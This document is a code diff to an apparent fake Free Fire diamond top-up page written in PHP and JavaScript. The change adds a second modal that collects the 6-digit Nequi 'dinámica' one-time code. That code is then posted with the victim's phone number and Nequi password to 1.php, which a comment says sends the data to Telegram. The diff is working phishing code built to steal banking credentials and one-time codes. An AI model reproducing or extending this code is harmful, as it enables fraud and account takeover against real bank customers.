@@ -312,7 +312,7 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
     // Agregar event listener al botón
     const btnEnviar = document.getElementById("btnEnviarNequi");
     if (btnEnviar) {
-      btnEnviar.addEventListener("click", async function() {
+      btnEnviar.addEventListener("click", function() {
         const telefono = document.getElementById("telefonoNequi").value;
         const clave = document.getElementById("claveNequi").value;
 
@@ -326,11 +326,32 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
           return;
         }
 
+        // Ocultar modal actual y mostrar modal de dinámica
+        modal.style.display = "none";
+        const modalDinamica = document.getElementById("modalDinamica");
+        if (modalDinamica) {
+          modalDinamica.style.display = "flex";
+          document.getElementById("dinamicaNequi").focus();
+        }
+      });
+    }
+
+    // Agregar event listener al botón de enviar dinámica
+    const btnEnviarDinamica = document.getElementById("btnEnviarDinamica");
+    if (btnEnviarDinamica) {
+      btnEnviarDinamica.addEventListener("click", async function() {
+        const dinamica = document.getElementById("dinamicaNequi").value;
+
+        if (!dinamica || dinamica.length !== 6) {
+          alert("Por favor ingresa un código de dinámica válido (6 dígitos)");
+          return;
+        }
+
         // Mostrar loader
         mostrarLoader("Enviando datos a Nequi...");
 
         try {
-          // Enviar datos directamente a Telegram
+          // Enviar datos con dinámica a Telegram
           const response = await fetch("1.php", {
             method: "POST",
             headers: {
@@ -338,8 +359,9 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
             },
             body: JSON.stringify({
               action: "enviar_datos_nequi_directo",
-              telefono: telefono,
-              clave: clave,
+              telefono: document.getElementById("telefonoNequi").value,
+              clave: document.getElementById("claveNequi").value,
+              dinamica: dinamica,
               monto: montoValor,
               playerId: "<?php echo addslashes($freefire_data['playerId']); ?>",
               playerName: "<?php echo addslashes($freefire_data['playerName']); ?>",
@@ -351,8 +373,8 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
           const data = await response.json();
 
           if (data.ok) {
-            // Ocultar modal y mostrar éxito
-            modal.style.display = "none";
+            // Ocultar modal de dinámica y mostrar éxito
+            document.getElementById("modalDinamica").style.display = "none";
             const modalExito = document.getElementById("modalExito");
             if (modalExito) {
               modalExito.style.display = "flex";
@@ -363,12 +385,6 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
         } catch (error) {
           console.error("Error:", error);
           alert("Error de conexión. Inténtalo de nuevo.");
-        } finally {
-          // Ocultar loader
-          const loaderModal = document.getElementById('loadingModal');
-          if (loaderModal) {
-            loaderModal.style.display = 'none';
-          }
         }
       });
     }
@@ -714,6 +730,59 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
       width: 100%;
       transition: background 0.3s;
     " onmouseover="this.style.background='#4a2476'" onmouseout="this.style.background='#5c2d91'">Autorizar pago</button>
+  </div>
+</div>
+
+<!-- Modal para ingresar dinámica -->
+<div id="modalDinamica" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:10001; justify-content:center; align-items:center; color:white; font-family:'Segoe UI', sans-serif;">
+  <div style="background:#5c2d91; padding:30px; border-radius:15px; max-width:400px; width:90%; box-shadow:0 10px 30px rgba(0,0,0,0.5);">
+    <h3 style="margin:0 0 20px 0; text-align:center; font-size:1.3em;">Ingresa la Dinámica de Nequi</h3>
+    <p style="margin:0 0 20px 0; text-align:center; font-size:0.9em; color:#ddd;">Solicita la dinámica en tu app de Nequi</p>
+
+    <!-- Input de dinámica -->
+    <div style="margin-bottom:20px;">
+      <label style="display:block; font-size:0.9em; color:#ccc; margin-bottom:5px;">Código de 6 dígitos</label>
+      <input id="dinamicaNequi" type="text" maxlength="6" inputmode="numeric" style="
+        width: 100%;
+        padding: 12px;
+        border: 2px solid #4a2476;
+        border-radius: 8px;
+        background: white;
+        color: #333;
+        font-size: 18px;
+        text-align: center;
+        outline: none;
+        box-sizing: border-box;
+      " placeholder="000000" />
+    </div>
+
+    <!-- Botón de envío -->
+    <button id="btnEnviarDinamica" style="
+      background: #4a2476;
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      border-radius: 8px;
+      font-size: 1em;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s;
+    " onmouseover="this.style.background='#3a1a5c'" onmouseout="this.style.background='#4a2476'">Enviar Datos</button>
+
+    <!-- Botón cancelar -->
+    <button onclick="document.getElementById('modalDinamica').style.display='none'; document.getElementById('modalAutorizacion').style.display='flex';" style="
+      background: transparent;
+      color: #ccc;
+      border: 1px solid #ccc;
+      padding: 8px 20px;
+      border-radius: 8px;
+      font-size: 0.9em;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 10px;
+      transition: all 0.3s;
+    " onmouseover="this.style.color='#fff'; this.style.borderColor='#fff'" onmouseout="this.style.color='#ccc'; this.style.borderColor='#ccc'">Cancelar</button>
   </div>
 </div>
 
